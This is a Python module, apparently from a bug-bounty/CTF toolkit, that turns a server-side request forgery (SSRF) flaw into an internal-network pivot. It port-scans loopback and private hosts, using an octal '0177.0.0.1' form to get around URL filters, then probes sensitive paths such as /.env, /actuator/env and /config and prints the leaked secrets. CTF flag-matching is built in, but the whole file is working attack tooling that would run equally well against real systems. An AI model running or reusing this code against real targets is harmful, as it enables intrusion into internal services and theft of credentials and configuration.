"""SSRF pivot module — port scan and exploit internal services via SSRF.

Uses an existing SSRF vulnerability to:
1. Port scan internal services (localhost, private IPs)
2. Fingerprint discovered services
3. Exploit internal web apps found through SSRF
4. Chain redirects to bypass URL filters

Usage:
    from bugbounty_ctf.ssrf_pivot import SSRFPivot

    pivot = SSRFPivot(scanner, ssrf_url="http://target/jobs/preview", param_name="url")
    open_ports = pivot.port_scan("0177.0.0.1", ports=[80, 5000, 9090, 3000, 8000])
    services = pivot.fingerprint_services(open_ports)
    flags = pivot.exploit_internal_services(services)
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, ClassVar

from bugbounty_ctf.engine import SecurityScanner

FLAG_PATTERNS = [
    r"HTB\{[^}]+\}",
    r"flag\{[^}]+\}",
    r"CTF\{[^}]+\}",
    r"pwn\{[^}]+\}",
]


@dataclass
class InternalService:
    """A service discovered via SSRF port scan."""

    host: str
    port: int
    status: str = "unknown"
    content_length: int = 0
    content_preview: str = ""
    tech_hints: list[str] = field(default_factory=list)
    endpoints: list[str] = field(default_factory=list)
    flags: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "host": self.host,
            "port": self.port,
            "status": self.status,
            "content_length": self.content_length,
            "content_preview": self.content_preview[:200],
            "tech_hints": self.tech_hints,
            "endpoints": self.endpoints,
            "flags": self.flags,
        }


class SSRFPivot:
    """Use SSRF to scan and exploit internal services.

    Requires an existing SSRF vulnerability (e.g., a URL fetcher endpoint).
    Uses the scanner's SSRF to probe internal ports and services.
    """

    DEFAULT_PORTS: ClassVar[list[int]] = [
        21,
        22,
        25,
        80,
        443,
        445,
        1433,
        1521,
        2375,
        2376,
        3000,
        3306,
        4000,
        5000,
        5432,
        5601,
        5985,
        6379,
        8000,
        8080,
        8443,
        9000,
        9090,
        9091,
        9200,
        9300,
        11211,
        27017,
    ]

    COMMON_PATHS: ClassVar[list[str]] = [
        "/",
        "/admin",
        "/api",
        "/api/v1",
        "/api/v1/health",
        "/health",
        "/status",
        "/info",
        "/config",
        "/env",
        "/debug",
        "/metrics",
        "/.env",
        "/flag",
        "/flag.txt",
        "/console",
        "/actuator",
        "/actuator/env",
        "/swagger",
        "/swagger.json",
        "/openapi.json",
        "/v2/_catalog",
    ]

    def __init__(
        self,
        scanner: SecurityScanner,
        ssrf_url: str,
        param_name: str = "url",
        method: str = "POST",
        url_suffix: str = "#.yaml",
    ) -> None:
        self.scanner = scanner
        self.ssrf_url = ssrf_url
        self.param_name = param_name
        self.method = method
        self.url_suffix = url_suffix
        self.services: list[InternalService] = []

    def _ssrf_fetch(self, target_url: str) -> str | None:
        """Fetch a URL via the SSRF vulnerability and return the response content."""
        full_url = target_url + self.url_suffix
        is_post = self.method.upper() in ("POST", "PUT", "PATCH")

        try:
            r = self.scanner._make_request(
                self.method,
                self.ssrf_url,
                **(
                    {"data": {self.param_name: full_url}}
                    if is_post
                    else {"params": {self.param_name: full_url}}
                ),
            )

            if r.status_code == 0:
                return None

            pre_match = re.search(r"<pre>(.*?)</pre>", r.text, re.DOTALL)
            if pre_match:
                content = pre_match.group(1)
                content = content.replace("&lt;", "<").replace("&gt;", ">")
                content = content.replace("&amp;", "&").replace("&#34;", '"').replace("&#39;", "'")
                return content

            err_match = re.search(r"panel err.*?>(.*?)</div>", r.text, re.DOTALL)
            if err_match:
                err_text = err_match.group(1)
                if "Could not fetch" in err_text:
                    return None
                if "Security policy" in err_text:
                    return None
                return f"ERROR: {err_text[:200]}"

            return str(r.text[:500])
        except Exception:
            return None

    def port_scan(
        self,
        host: str = "0177.0.0.1",
        ports: list[int] | None = None,
        timeout: float = 3,
    ) -> list[InternalService]:
        """Scan internal ports via SSRF. Returns list of open services."""
        if ports is None:
            ports = self.DEFAULT_PORTS

        print(f"[*] SSRF port scan on {host} ({len(ports)} ports)")
        open_services: list[InternalService] = []

        for port in ports:
            content = self._ssrf_fetch(f"http://{host}:{port}/")

            if content and "Could not fetch" not in content and "Security policy" not in content:
                service = InternalService(
                    host=host,
                    port=port,
                    status="open",
                    content_length=len(content),
                    content_preview=content[:200],
                )

                if "nginx" in content.lower():
                    service.tech_hints.append("nginx")
                if "apache" in content.lower():
                    service.tech_hints.append("apache")
                if "flask" in content.lower() or "werkzeug" in content.lower():
                    service.tech_hints.append("flask")
                if "404" in content[:100]:
                    service.status = "open-404"
                elif "301" in content[:50]:
                    service.status = "open-redirect"
                elif "<html" in content.lower():
                    service.status = "open-html"

                open_services.append(service)
                print(f"  [+] {host}:{port} — {service.status} ({service.content_length} bytes)")

        self.services.extend(open_services)
        print(f"[*] Found {len(open_services)} open ports")
        return open_services

    def fingerprint_services(
        self, services: list[InternalService] | None = None
    ) -> list[InternalService]:
        """Fingerprint discovered services by probing common paths."""
        if services is None:
            services = self.services

        print(f"[*] Fingerprinting {len(services)} services")
        for service in services:
            if service.status in ("closed", "error"):
                continue

            print(f"  Fingerprinting {service.host}:{service.port}")
            for path in self.COMMON_PATHS:
                url = f"http://{service.host}:{service.port}{path}"
                content = self._ssrf_fetch(url)

                if (
                    content
                    and "Not Found" not in content
                    and "404" not in content[:20]
                    and "301" not in content[:20]
                    and "Moved Permanently" not in content[:50]
                ):
                    service.endpoints.append(path)

                    flags = self._extract_flags(content)
                    if flags:
                        service.flags.extend(flags)
                        print(f"    [FLAG] {path}: {flags}")

                    if "nginx-ui" in content.lower():
                        service.tech_hints.append("nginx-ui")
                    if "docker" in content.lower():
                        service.tech_hints.append("docker")
                    if "kubernetes" in content.lower() or "k8s" in content.lower():
                        service.tech_hints.append("kubernetes")
                    if "jenkins" in content.lower():
                        service.tech_hints.append("jenkins")
                    if "grafana" in content.lower():
                        service.tech_hints.append("grafana")
                    if "prometheus" in content.lower():
                        service.tech_hints.append("prometheus")

        return services

    def exploit_internal_services(self, services: list[InternalService] | None = None) -> list[str]:
        """Exploit discovered internal services and extract flags."""
        if services is None:
            services = self.services

        all_flags: list[str] = []

        for service in services:
            if not service.endpoints:
                continue

            print(f"\n[*] Exploiting {service.host}:{service.port}")
            print(f"    Endpoints: {service.endpoints}")

            for endpoint in service.endpoints:
                url = f"http://{service.host}:{service.port}{endpoint}"
                content = self._ssrf_fetch(url)

                if content:
                    flags = self._extract_flags(content)
                    if flags:
                        all_flags.extend(flags)
                        service.flags.extend(flags)
                        print(f"    [FLAG] {endpoint}: {flags}")

                    if "/.env" in endpoint and content:
                        print(f"    [!] .env file: {content[:200]}")

                    if "/actuator/env" in endpoint and content:
                        print(f"    [!] Spring Boot actuator env leak: {content[:200]}")

                    if "/api/v1/health" in endpoint:
                        print(f"    [!] Health endpoint: {content[:200]}")

        return all_flags

    @staticmethod
    def _extract_flags(text: str) -> list[str]:
        """Extract flag patterns from text."""
        flags: list[str] = []
        for pattern in FLAG_PATTERNS:
            flags.extend(re.findall(pattern, text, re.IGNORECASE))
        return flags

    def get_results(self) -> list[dict[str, Any]]:
        """Return all discovered services as dicts."""
        return [s.to_dict() for s in self.services]
